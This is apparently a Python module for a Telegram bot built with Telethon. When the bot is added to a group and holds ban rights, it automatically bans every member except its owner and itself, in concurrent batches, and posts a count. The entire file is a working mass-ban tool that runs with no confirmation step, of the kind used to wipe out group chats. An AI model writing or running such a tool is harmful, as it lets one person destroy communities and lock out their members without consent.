from telethon import events, errors
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelBannedRights
from Banall import bot, OWNER_ID
import asyncio
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BANNED_RIGHTS = ChannelBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True
)

async def ban_member(bot, chat, user_id):
    try:
        await bot(EditBannedRequest(chat, user_id, BANNED_RIGHTS))
        return True, user_id
    except Exception as e:
        return False, f"{user_id}: {e}"

@bot.on(events.ChatAction())
async def auto_banall(event):
    if not event.user_added and not event.user_joined and not event.created:
        return

    if event.user_id != (await bot.get_me()).id:
        return  # Only act when the bot is promoted

    chat = await event.get_chat()
    admin = await bot.get_permissions(chat.id, (await bot.get_me()).id)

    if not admin or not admin.is_admin or not admin.ban_users:
        return

    await bot.send_message(chat.id, "**Auto Banall Started...**")

    total, success, failed = 0, 0, 0
    failed_users = []
    tasks = []

    async for user in bot.iter_participants(chat):
        if user.id in [OWNER_ID, (await bot.get_me()).id]:
            continue
        total += 1
        tasks.append(ban_member(bot, chat, user.id))

        if len(tasks) >= 10:
            results = await asyncio.gather(*tasks)
            for ok, res in results:
                if ok:
                    success += 1
                else:
                    failed += 1
                    failed_users.append(res)
            tasks = []

    if tasks:
        results = await asyncio.gather(*tasks)
        for ok, res in results:
            if ok:
                success += 1
            else:
                failed += 1
                failed_users.append(res)

    await bot.send_message(chat.id, f"**Auto Banall Completed!**\nTotal: {total}\nBanned: {success}\nFailed: {failed}")
